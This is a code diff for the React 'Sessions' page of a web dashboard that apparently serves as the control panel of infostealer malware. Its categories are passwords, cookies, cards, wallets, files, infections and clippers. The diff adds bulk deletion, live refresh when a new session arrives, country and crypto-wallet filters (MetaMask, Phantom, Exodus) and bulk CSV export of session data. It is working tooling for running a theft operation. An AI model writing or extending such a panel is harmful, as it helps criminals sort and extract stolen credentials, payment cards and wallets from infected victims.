@@ -1,6 +1,6 @@
 import { useState, useMemo, useEffect } from 'react'
 import { useNavigate, useLocation } from 'react-router-dom'
-import { useQuery, keepPreviousData } from '@tanstack/react-query'
+import { useQuery, useMutation, useQueryClient, keepPreviousData } from '@tanstack/react-query'
 import { useI18n } from '@/lib/i18n'
 import {
   useTable,
@@ -11,7 +11,7 @@ import {
 } from '@tanstack/react-table'
 import type { SortingState, PaginationState } from '@tanstack/react-table'
 import { formatDistanceToNow } from 'date-fns'
-import { ChevronLeft, ChevronRight, Search, Settings2, Eye, EyeOff } from 'lucide-react'
+import { ChevronLeft, ChevronRight, Search, Settings2, Eye, EyeOff, Trash2, Download } from 'lucide-react'
 import { api } from '@/lib/api'
 import { Button } from '@/components/ui/button'
 import { Input } from '@/components/ui/input'
@@ -33,7 +33,19 @@ import {
   DropdownMenuLabel,
   DropdownMenuSeparator,
 } from '@/components/ui/dropdown-menu'
+import {
+  AlertDialog,
+  AlertDialogTrigger,
+  AlertDialogContent,
+  AlertDialogHeader,
+  AlertDialogTitle,
+  AlertDialogDescription,
+  AlertDialogFooter,
+  AlertDialogCancel,
+  AlertDialogAction,
+} from '@/components/ui/alert-dialog'
 import type { SessionListItem, SessionPage } from '@/types'
+import { COUNTRY_NAMES } from '@/lib/countries'
 
 const features = tableFeatures({
   rowSortingFeature,
@@ -73,17 +85,21 @@ export default function Sessions() {
   const navigate = useNavigate()
   const location = useLocation()
   const { t } = useI18n()
+  const queryClient = useQueryClient()
+
+  // Auto-refresh sessions list on new session via WebSocket
+  useEffect(() => {
+    const unsub = wsClient.on('new_session', () => {
+      queryClient.invalidateQueries({ queryKey: ['sessions'] })
+    })
+    return unsub
+  }, [queryClient])
 
   const COUNTRY_OPTIONS = [
     { value: '', label: t('sessions.all_countries') },
-    { value: 'RU', label: 'Russia' },
-    { value: 'US', label: 'United States' },
-    { value: 'BR', label: 'Brazil' },
-    { value: 'IN', label: 'India' },
-    { value: 'DE', label: 'Germany' },
-    { value: 'GB', label: 'United Kingdom' },
-    { value: 'FR', label: 'France' },
-    { value: 'CN', label: 'China' },
+    ...Object.entries(COUNTRY_NAMES)
+      .sort(([, a], [, b]) => a.localeCompare(b))
+      .map(([code, name]) => ({ value: code, label: name })),
   ]
 
   const DATE_PRESETS = [
@@ -100,9 +116,11 @@ export default function Sessions() {
   const [search, setSearch] = useState('')
   const [debouncedSearch, setDebouncedSearch] = useState('')
   const [countryFilter, setCountryFilter] = useState('')
+  const [walletFilter, setWalletFilter] = useState('')
   const [datePreset, setDatePreset] = useState('')
   const [emptyOnly, setEmptyOnly] = useState(false)
   const [blurred, setBlurred] = useState(false)
+  const [selected, setSelected] = useState<Set<string>>(new Set())
   const [visibleColumns, setVisibleColumns] = useState<Record<string, boolean>>(() => {
     const saved = localStorage.getItem('session_columns')
     if (saved) {
@@ -127,12 +145,12 @@ export default function Sessions() {
 
   useEffect(() => {
     setPagination(prev => ({ ...prev, pageIndex: 0 }))
-  }, [sort, countryFilter, debouncedSearch, datePreset, emptyOnly, apiType])
+  }, [sort, countryFilter, walletFilter, debouncedSearch, datePreset, emptyOnly, apiType])
 
   const dateRange = useMemo(() => getDateRange(datePreset), [datePreset])
 
   const query = useQuery<SessionPage>({
-    queryKey: ['sessions', pagination.pageIndex + 1, pagination.pageSize, sort, debouncedSearch, countryFilter, datePreset, emptyOnly, apiType],
+    queryKey: ['sessions', pagination.pageIndex + 1, pagination.pageSize, sort, debouncedSearch, countryFilter, walletFilter, datePreset, emptyOnly, apiType],
     queryFn: () => api.get<SessionPage>('/api/sessions', {
       page: pagination.pageIndex + 1,
       limit: pagination.pageSize,
@@ -143,13 +161,69 @@ export default function Sessions() {
       date_to: dateRange.to,
       empty_only: emptyOnly || undefined,
       type: apiType || undefined,
+      wallet_type: walletFilter || undefined,
     }),
     placeholderData: keepPreviousData,
   })
 
   const data = query.data
 
+  const bulkDeleteMutation = useMutation({
+    mutationFn: async () => {
+      const ids = Array.from(selected)
+      await Promise.all(ids.map(sid => api.del(`/api/sessions/${sid}`)))
+    },
+    onSuccess: () => {
+      setSelected(new Set())
+      queryClient.invalidateQueries({ queryKey: ['sessions'] })
+    },
+  })
+
+  const toggleSelect = (id: string) => {
+    setSelected(prev => {
+      const next = new Set(prev)
+      if (next.has(id)) next.delete(id)
+      else next.add(id)
+      return next
+    })
+  }
+
+  const toggleSelectAll = () => {
+    const rows = data?.sessions ?? []
+    if (selected.size === rows.length && rows.length > 0) {
+      setSelected(new Set())
+    } else {
+      setSelected(new Set(rows.map(r => r.id)))
+    }
+  }
+
   const columns = useMemo(() => columnHelper.columns([
+    columnHelper.display({
+      id: 'select',
+      header: () => {
+        const rows = data?.sessions ?? []
+        const allSelected = rows.length > 0 && selected.size === rows.length
+        return (
+          <input
+            type="checkbox"
+            checked={allSelected}
+            onChange={toggleSelectAll}
+            className="rounded"
+            aria-label="Select all"
+          />
+        )
+      },
+      cell: ({ row }) => (
+        <input
+          type="checkbox"
+          checked={selected.has(row.original.id)}
+          onChange={() => toggleSelect(row.original.id)}
+          onClick={(e) => e.stopPropagation()}
+          className="rounded"
+          aria-label={`Select row ${row.index + 1}`}
+        />
+      ),
+    }),
     columnHelper.display({
       id: 'row',
       header: '#',
@@ -267,10 +341,10 @@ export default function Sessions() {
       enableSorting: true,
       cell: ({ getValue }) => formatDistanceToNow(new Date(getValue()), { addSuffix: true }),
     }),
-  ]), [pagination.pageIndex, pagination.pageSize, blurred])
+  ]), [pagination.pageIndex, pagination.pageSize, blurred, selected, data?.sessions])
 
   const visibleCols = useMemo(
-    () => columns.filter(c => visibleColumns[c.id ?? ''] ?? true),
+    () => columns.filter(c => c.id === 'select' || c.id === 'row' || (visibleColumns[c.id ?? ''] ?? true)),
     [columns, visibleColumns]
   )
 
@@ -311,6 +385,30 @@ export default function Sessions() {
       <div className="flex items-center justify-between">
         <h1 className="text-2xl font-semibold tracking-tight">{(['passwords','cookies','cards','wallets','files','infections','clippers','tasks'] as string[]).includes(category) ? t(`nav.${category}` as any) : t('sessions.title')}</h1>
         <div className="flex items-center gap-2">
+          {selected.size > 0 && (
+            <AlertDialog>
+              <AlertDialogTrigger asChild>
+                <Button variant="destructive" size="sm">
+                  <Trash2 className="h-4 w-4 mr-2" />
+                  Delete Selected ({selected.size})
+                </Button>
+              </AlertDialogTrigger>
+              <AlertDialogContent>
+                <AlertDialogHeader>
+                  <AlertDialogTitle>Delete {selected.size} Session{selected.size > 1 ? 's' : ''}</AlertDialogTitle>
+                  <AlertDialogDescription>
+                    Are you sure you want to delete {selected.size} selected session{selected.size > 1 ? 's' : ''}? This action cannot be undone.
+                  </AlertDialogDescription>
+                </AlertDialogHeader>
+                <AlertDialogFooter>
+                  <AlertDialogCancel>Cancel</AlertDialogCancel>
+                  <AlertDialogAction onClick={() => bulkDeleteMutation.mutate()} className="bg-destructive text-destructive-foreground hover:bg-destructive/90">
+                    Delete
+                  </AlertDialogAction>
+                </AlertDialogFooter>
+              </AlertDialogContent>
+            </AlertDialog>
+          )}
           <select
             value={datePreset}
             onChange={(e) => setDatePreset(e.target.value)}
@@ -338,6 +436,47 @@ export default function Sessions() {
               <option key={opt.value} value={opt.value}>{opt.label}</option>
             ))}
           </select>
+          <select
+            value={walletFilter}
+            onChange={(e) => setWalletFilter(e.target.value)}
+            className="h-10 rounded-md border border-input bg-background px-3 py-2 text-sm"
+          >
+            <option value="">{t('sessions.all_wallets')}</option>
+            <option value="MetaMask">MetaMask</option>
+            <option value="Phantom">Phantom</option>
+            <option value="Coinbase">Coinbase</option>
+            <option value="Trust Wallet">Trust Wallet</option>
+            <option value="Exodus">Exodus</option>
+            <option value="Electrum">Electrum</option>
+            <option value="Atomic">Atomic</option>
+            <option value="Binance Chain">Binance Chain</option>
+            <option value="Ronin">Ronin</option>
+            <option value="Yoroi">Yoroi</option>
+            <option value="Daedalus">Daedalus</option>
+          </select>
+          <Button
+            variant="outline"
+            size="sm"
+            onClick={() => {
+              const ids = data?.sessions?.map(s => s.id) ?? []
+              if (ids.length === 0) return
+              const token = localStorage.getItem('token')
+              fetch('/api/export/bulk', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', Authorization: 'Bearer ' + token },
+                body: JSON.stringify({ session_ids: ids, format: 'csv' }),
+              }).then(r => r.blob()).then(blob => {
+                const a = document.createElement('a')
+                a.href = URL.createObjectURL(blob)
+                a.download = 'sessions.csv'
+                a.click()
+                URL.revokeObjectURL(a.href)
+              })
+            }}
+          >
+            <Download className="h-4 w-4 mr-1" />
+            CSV
+          </Button>
           <Button
             variant="outline"
             size="sm"
